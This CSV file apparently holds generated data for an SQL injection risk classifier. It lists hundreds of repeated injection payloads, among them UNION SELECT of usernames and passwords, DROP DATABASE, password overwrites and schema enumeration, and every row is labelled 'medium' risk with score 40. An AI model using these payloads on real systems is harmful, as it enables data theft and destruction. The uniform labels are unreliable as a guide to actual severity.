query,risk,score
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # q",medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 5,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # e",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # v",medium,40
'; SELECT COUNT(*) FROM users -- # l,medium,40
' HAVING 1=1 # -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # f",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # n,medium,40
'; SELECT COUNT(*) FROM users -- # 3,medium,40
"' UNION SELECT username, password FROM users -- # w",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- # i,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- # o,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
'; SELECT COUNT(*) FROM users -- # y,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # g",medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
' or 1=1 in (select * from users) -- # 1,medium,40
'; DROP DATABASE temp -- # 2,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- # w,medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # n",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 9",medium,40
'; DROP DATABASE temp -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # n,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
' or 1 = 1 LIMIT 1 -- # x,medium,40
'; DROP DATABASE temp -- # i,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 4,medium,40
' OR username LIKE '%admin%' -- # f,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1=1 in (select * from users) -- # z,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 8",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # v",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' or 1 = 1 LIMIT 1 -- # y,medium,40
'; DROP DATABASE temp -- # b,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # l",medium,40
' UNION SELECT * FROM information_schema.tables -- # e,medium,40
'; SELECT COUNT(*) FROM users -- # 4,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' OR username LIKE '%admin%' -- # 1,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
' HAVING 1=1 # # y,medium,40
'; SELECT COUNT(*) FROM users -- # e,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; UPDATE users SET password='pass' # 4,medium,40
' or 1=1 in (select * from users) -- # 4,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 5",medium,40
'; DROP DATABASE temp -- # 3,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 1",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # w",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # l",medium,40
'; SELECT @@version -- # u,medium,40
' HAVING 1=1 # -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # x",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # p,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- # k,medium,40
1' OR '1' = '1' GROUP BY 1 -- # b,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- # s,medium,40
' HAVING 1=1 # # u,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # x",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 7",medium,40
"' UNION SELECT username, password FROM users -- # 2",medium,40
'; UPDATE users SET password='pass' # a,medium,40
' UNION SELECT * FROM information_schema.tables -- # b,medium,40
' or 1=1 in (select * from users) -- # c,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' OR username LIKE '%admin%' -- # v,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # s",medium,40
' HAVING 1=1 # # n,medium,40
'; SELECT @@version -- # 2,medium,40
'; SELECT COUNT(*) FROM users -- # i,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 5",medium,40
' HAVING 1=1 # # x,medium,40
' HAVING 1=1 # # j,medium,40
' or 1=1 in (select * from users) -- # c,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # r",medium,40
' UNION SELECT * FROM information_schema.tables -- # n,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- # z,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # k,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # 7",medium,40
'; DROP DATABASE temp -- # b,medium,40
1' OR '1' = '1' GROUP BY 1 -- # a,medium,40
'; SELECT @@version -- -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # q,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # a",medium,40
1' OR '1' = '1' GROUP BY 1 -- # k,medium,40
'; SELECT @@version -- # s,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 0",medium,40
' UNION SELECT * FROM information_schema.tables -- # w,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; SELECT @@version -- # 4,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; UPDATE users SET password='pass' # 2,medium,40
' or 1=1 in (select * from users) -- # g,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # l,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- # x,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
'; SELECT @@version -- # h,medium,40
'; SELECT @@version -- # k,medium,40
'; SELECT @@version -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # i,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 2,medium,40
' UNION SELECT * FROM information_schema.tables -- # r,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 1",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # w,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 0,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # i",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
' OR username LIKE '%admin%' -- # z,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; DROP DATABASE temp -- # 0,medium,40
' HAVING 1=1 # # 1,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' or 1=1 in (select * from users) -- # a,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' OR username LIKE '%admin%' -- # 5,medium,40
' HAVING 1=1 # -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' or 1=1 in (select * from users) -- # 5,medium,40
' OR username LIKE '%admin%' -- # n,medium,40
'; UPDATE users SET password='pass' # u,medium,40
' or 1=1 in (select * from users) -- # r,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; SELECT @@version -- # g,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' HAVING 1=1 # # p,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- # r,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # y",medium,40
' UNION SELECT * FROM information_schema.tables -- # i,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; DROP DATABASE temp -- # w,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- # z,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; UPDATE users SET password='pass' # 4,medium,40
' UNION SELECT * FROM information_schema.tables -- # z,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' or 1 = 1 LIMIT 1 -- # v,medium,40
1' OR 1=1; SELECT * FROM users -- # i,medium,40
' or 1 = 1 LIMIT 1 -- # v,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # e",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 1",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # j,medium,40
1' OR 1=1; SELECT * FROM users -- # r,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' or 1=1 in (select * from users) -- # n,medium,40
'; SELECT COUNT(*) FROM users -- # k,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # m",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- # y",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # 0,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; SELECT @@version -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # h",medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; UPDATE users SET password='pass' # p,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # w",medium,40
' HAVING 1=1 # # 1,medium,40
'; UPDATE users SET password='pass' # l,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; UPDATE users SET password='pass' # 9,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
"' UNION SELECT username, password FROM users -- # g",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- # f,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 0",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # j",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # w",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
"' UNION SELECT username, password FROM users -- # m",medium,40
' or 1 = 1 LIMIT 1 -- # 6,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; UPDATE users SET password='pass' # r,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
'; DROP DATABASE temp -- # z,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 2",medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- # p,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # u",medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
' HAVING 1=1 # # a,medium,40
'; SELECT @@version -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' HAVING 1=1 # # 7,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' HAVING 1=1 # -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # p",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # n",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # z,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' or 1=1 in (select * from users) -- # f,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 8,medium,40
' or 1=1 in (select * from users) -- # k,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 1",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # x",medium,40
' or 1 = 1 LIMIT 1 -- # 9,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # e",medium,40
' HAVING 1=1 # -- ,medium,40
' HAVING 1=1 # -- ,medium,40
"' UNION SELECT username, password FROM users -- # h",medium,40
' HAVING 1=1 # # h,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- # q,medium,40
"' UNION SELECT username, password FROM users -- # f",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- # i,medium,40
1' OR '1' = '1' GROUP BY 1 -- # s,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # l",medium,40
'; SELECT COUNT(*) FROM users -- # o,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 5",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # q",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # d,medium,40
1' OR 1=1; SELECT * FROM users -- # d,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; SELECT @@version -- -- ,medium,40
' OR username LIKE '%admin%' -- # g,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 7",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' OR username LIKE '%admin%' -- # g,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; DROP DATABASE temp -- # 2,medium,40
'; DROP DATABASE temp -- # l,medium,40
'; DROP DATABASE temp -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # w,medium,40
' UNION SELECT * FROM information_schema.tables -- # h,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' OR username LIKE '%admin%' -- # 9,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # i",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # d",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; SELECT @@version -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- # a,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # n",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # d,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # x",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
'; UPDATE users SET password='pass' # y,medium,40
'; SELECT COUNT(*) FROM users -- # a,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # i,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; UPDATE users SET password='pass' # y,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # d",medium,40
'; SELECT @@version -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
' or 1 = 1 LIMIT 1 -- # 2,medium,40
' HAVING 1=1 # # n,medium,40
'; SELECT COUNT(*) FROM users -- # w,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # d,medium,40
'; SELECT COUNT(*) FROM users -- # i,medium,40
'; SELECT COUNT(*) FROM users -- # m,medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # b",medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' or 1=1 in (select * from users) -- # 1,medium,40
'; SELECT @@version -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # u,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' or 1 = 1 LIMIT 1 -- # i,medium,40
' UNION SELECT * FROM information_schema.tables -- # m,medium,40
"' UNION SELECT username, password FROM users -- # f",medium,40
' UNION SELECT * FROM information_schema.tables -- # 4,medium,40
1' OR 1=1; SELECT * FROM users -- # m,medium,40
' UNION SELECT * FROM information_schema.tables -- # 1,medium,40
' or 1 = 1 LIMIT 1 -- # 9,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # j",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
'; SELECT @@version -- # 6,medium,40
'; SELECT COUNT(*) FROM users -- # 5,medium,40
' HAVING 1=1 # # 8,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # d",medium,40
'; DROP DATABASE temp -- # o,medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; DROP DATABASE temp -- # r,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # w",medium,40
'; DROP DATABASE temp -- # z,medium,40
'; DROP DATABASE temp -- # v,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # o",medium,40
1' OR '1' = '1' GROUP BY 1 -- # l,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 9",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; SELECT @@version -- # d,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 9",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' or 1=1 in (select * from users) -- # 4,medium,40
'; DROP DATABASE temp -- # r,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' or 1=1 in (select * from users) -- # 7,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- # v,medium,40
'; SELECT @@version -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # 0,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
'; DROP DATABASE temp -- # 7,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # r,medium,40
' HAVING 1=1 # # h,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; DROP DATABASE temp -- # 8,medium,40
'; SELECT @@version -- # 6,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # 5",medium,40
' or 1 = 1 LIMIT 1 -- # c,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- # 9,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # h",medium,40
'; UPDATE users SET password='pass' # v,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' HAVING 1=1 # -- ,medium,40
"' UNION SELECT username, password FROM users -- # k",medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # w",medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' HAVING 1=1 # # 9,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
' or 1 = 1 LIMIT 1 -- # e,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
'; SELECT @@version -- # b,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
' or 1=1 in (select * from users) -- # 8,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- # h,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 1",medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' OR username LIKE '%admin%' -- # q,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # d,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # y",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
